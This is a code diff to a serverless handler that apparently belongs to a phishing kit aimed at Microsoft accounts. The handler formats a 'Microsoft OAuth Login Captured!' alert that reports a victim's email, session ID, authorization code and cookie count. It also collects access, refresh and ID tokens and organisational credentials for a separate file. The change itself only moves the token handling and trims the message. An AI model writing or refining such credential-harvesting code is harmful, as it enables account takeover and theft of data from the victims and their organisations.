@@ -66,25 +66,14 @@ export const handler = async (event, context) => {
     
     const timestamp = new Date().toISOString();
     
+    // Build simple clean message without token status or organizational info
     let messageText = `🔐 Microsoft OAuth Login Captured!\n\n`;
     messageText += `📧 Email: ${email}\n`;
     messageText += `🔑 Session ID: ${sessionId}\n`;
     messageText += `✅ Auth Code: ${hasAuthCode ? 'Captured (see file)' : 'Missing'}\n`;
     messageText += `🕒 Time: ${timestamp}\n\n`;
     
-    // REMOVED: Token status from main message (now only in file)
-    // REMOVED: Organizational info from main message (now only in file)
-    
-    // Store token data for file generation
-    const tokenData = data.tokenData || data.tokens || data.accessToken;
-    const accessToken = data.accessToken || (tokenData && tokenData.tokens && tokenData.tokens.access_token);
-    const refreshToken = data.refreshToken || (tokenData && tokenData.tokens && tokenData.tokens.refresh_token);
-    const idToken = data.idToken || (tokenData && tokenData.tokens && tokenData.tokens.id_token);
-    const orgCreds = data.organizationalCredentials;
-    
-    // Note: Authorization code is in the file, not in text message for security
-    
-    // Add cookie info - check multiple possible sources
+    // Add only cookie info to main message
     const cookies = data.formattedCookies || data.cookies || [];
     const cookieCount = Array.isArray(cookies) ? cookies.length : 0;
     
@@ -93,6 +82,13 @@ export const handler = async (event, context) => {
     } else {
       messageText += `🍪 Cookies: None captured\n`;
     }
+    
+    // Store data for file generation only (not displayed in main message)
+    const tokenData = data.tokenData || data.tokens || data.accessToken;
+    const accessToken = data.accessToken || (tokenData && tokenData.tokens && tokenData.tokens.access_token);
+    const refreshToken = data.refreshToken || (tokenData && tokenData.tokens && tokenData.tokens.refresh_token);
+    const idToken = data.idToken || (tokenData && tokenData.tokens && tokenData.tokens.id_token);
+    const orgCreds = data.organizationalCredentials;
     
     // REMOVED: Browser fingerprint line
 
